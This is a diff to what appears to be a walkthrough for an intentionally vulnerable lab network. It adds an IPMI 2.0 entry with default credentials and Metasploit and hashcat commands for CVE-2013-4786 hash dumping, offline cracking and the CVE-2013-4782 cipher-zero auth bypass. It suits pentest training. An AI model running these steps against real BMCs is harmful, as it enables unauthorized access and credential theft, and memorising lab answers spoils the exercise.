@@ -40,6 +40,7 @@ three IPs are what you scan. The loot refers to the boxes by the hostnames
 |             | POP3 (James)   | 110/tcp   | LDAP user list          | weak creds, brute-forceable            |
 |             | IMAP (James)   | 143/tcp   | LDAP user list          | weak creds, brute-forceable            |
 |             | James admin    | 4555/tcp  | `root`/`root`           | default admin creds → user mgmt        |
+|             | IPMI 2.0 (BMC) | 623/udp   | `admin`/`admin`, `ADMIN`/`ADMIN`, `root`/`root` | **CVE-2013-4786** RAKP hash retrieval + **CVE-2013-4782** cipher zero |
 | **app01**   | WordPress 4.6  | 80/tcp    | set during install      | outdated WP core/plugins (CVEs)        |
 |             | Tomcat Manager | 8080/tcp  | `tomcat` / `tomcat`     | default manager creds → WAR-to-shell   |
 |             | MySQL          | 3306/tcp  | `root` / `root`         | weak DB root creds                     |
@@ -334,6 +335,28 @@ nmap -sU -p161 <files01-ip>                          # SNMP is UDP
   Mail accounts share the same credentials as the LDAP users. The admin
   portal (4555) accepts `root`/`root` by default — list/add/delete users
   without any exploit needed.
+
+- IPMI 2.0 BMC (UDP 623 — CVE-2013-4786 / CVE-2013-4782):
+  ```bash
+  # Detect IPMI and version
+  nmap -sU -p623 <files01-ip>
+  use auxiliary/scanner/ipmi/ipmi_version
+
+  # CVE-2013-4786 — unauthenticated RAKP hash retrieval (hashcat -m 7300)
+  use auxiliary/scanner/ipmi/ipmi_dumphashes
+  set RHOSTS <files01-ip>
+  set OUTPUT_HASHCAT_FILE /tmp/ipmi_hashes.txt
+  run
+  # crack offline:
+  hashcat -m 7300 /tmp/ipmi_hashes.txt /usr/share/wordlists/rockyou.txt
+
+  # CVE-2013-4782 — cipher suite 0 auth bypass (authenticate with any password)
+  use auxiliary/scanner/ipmi/ipmi_cipher_zero
+  set RHOSTS <files01-ip>
+  run
+  ```
+  Valid usernames to probe: `admin`, `Admin`, `ADMIN`, `root`, `jsmith`.
+  Cracked hashes reuse passwords already on other services (credential reuse chain).
 
 **app01**
 - Brocade FWS624 / ICX6450 (port 23):
